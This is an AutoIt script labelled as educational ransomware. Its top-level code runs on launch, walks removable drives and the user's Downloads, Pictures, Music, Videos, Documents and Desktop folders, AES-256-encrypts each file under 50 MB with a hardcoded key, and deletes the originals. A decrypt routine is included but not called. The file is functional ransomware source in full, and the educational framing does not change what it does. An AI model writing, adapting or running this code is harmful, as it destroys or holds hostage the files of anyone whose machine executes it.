#cs ----------------------------------------------------------------------------

 AutoIt Version: 1.0.0.0
 Author:         Artist

 Script Function:
	Ransomware for educational purpose

#ce ----------------------------------------------------------------------------

; to decrypt the files replace GetFilesToCrypt() by GetFilesToDecrypt

#include <Crypt.au3>
#include <File.au3>

$key = "super cypher key" ; Replace by _Randomstring() function

Func _Randomstring($length)
    $chars= StringSplit("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789","")
    $String = ""
    $i=0
    Do
        If $length<=0 then ExitLoop
        $String &=  $chars[Random(1,$chars[0])]
        $i += 1
    Until $i = $length
    Return $String
EndFunc

Func Crypt($file)
	If Not @error Then
	_Crypt_EncryptFile($file, $file & '.CRYPTED', $key, $CALG_AES_256)
	FileDelete($file)
	EndIf
EndFunc

Func Decrypt($file)
	$filename = StringReplace($file, '.CRYPTED', '')
	_Crypt_DecryptFile($file, $filename, $key, $CALG_AES_256)
	FileDelete($file)
EndFunc

Func GetFilesToDecrypt()
	$files = _FileListToArrayRec(@DesktopDir, "*.CRYPTED", 1, 1, 0, 2)
	For $i = 1 To $files[0]
			Decrypt($files[$i])
	Next
EndFunc

Func GetFilesToCrypt($path)
	If $path <> "" Then
	$files = _FileListToArrayRec($path, "*.*", 1, 1, 0, 2)
	For $i = 1 To $files[0]
		$size = FileGetSize($files[$i]) / 1024
		If Not StringInStr($files[$i], '.CRYPTED') And $size < 50000 Then ; Files are encrypted only if they are smaller than 50 MB
			Crypt($files[$i])
		EndIf
	Next
	EndIf
EndFunc

Func GetDrives()
	$drives = DriveGetDrive($DT_REMOVABLE)
	$list = ""
	For $i = 1 To $drives[0]
		$list &=  $drives[$i] & '|'
	Next
	Return $list
EndFunc

;==============Encryption / Decryption==========
$drivesfounded = StringSplit(GetDrives(), '|', 1)
For $i = 1 To $drivesfounded[0]
	GetFilesToCrypt($drivesfounded[$i])
Next

GetFilesToCrypt(@UserProfileDir & '\Downloads')
GetFilesToCrypt(@UserProfileDir & '\Pictures')
GetFilesToCrypt(@UserProfileDir & '\Music')
GetFilesToCrypt(@UserProfileDir & '\Videos')
GetFilesToCrypt(@UserProfileDir & '\Documents')
GetFilesToCrypt(@DesktopDir)

MsgBox(0, "", "Done")
;/==============Encryption / Decryption==========
